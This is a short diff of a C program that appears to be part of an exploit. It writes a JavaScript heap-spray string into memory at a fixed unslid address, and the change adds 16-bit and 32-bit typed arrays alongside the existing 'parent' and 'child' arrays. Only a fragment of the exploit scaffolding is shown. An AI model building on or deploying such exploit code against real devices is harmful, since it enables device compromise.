@@ -341,6 +341,10 @@ int main(int   argc,
 			writebuf_unslid(0x108000,
 							"var parent = new Uint8Array(0x100);"
 							"var child = new Uint8Array(0x100);"
+							"var parent16 = new Uint16Array(0x100);"
+							"var child16 = new Uint16Array(0x100);"
+							"var parent32 = new Uint32Array(0x100);"
+							"var child32 = new Uint32Array(0x100);"
 							"    var fuck = new Array();"
 							"    for (var i = 0; i < 0x200000; i++) {"
 							"        fuck[i] = i;"
@@ -350,6 +354,10 @@ int main(int   argc,
 							"//shitalloc();",
 							strlen("var parent = new Uint8Array(0x100);"
 								   "var child = new Uint8Array(0x100);"
+								   "var parent16 = new Uint16Array(0x100);"
+								   "var child16 = new Uint16Array(0x100);"
+								   "var parent32 = new Uint32Array(0x100);"
+								   "var child32 = new Uint32Array(0x100);"
 								   "    var fuck = new Array();"
 								   "    for (var i = 0; i < 0x200000; i++) {"
 								   "        fuck[i] = i;"
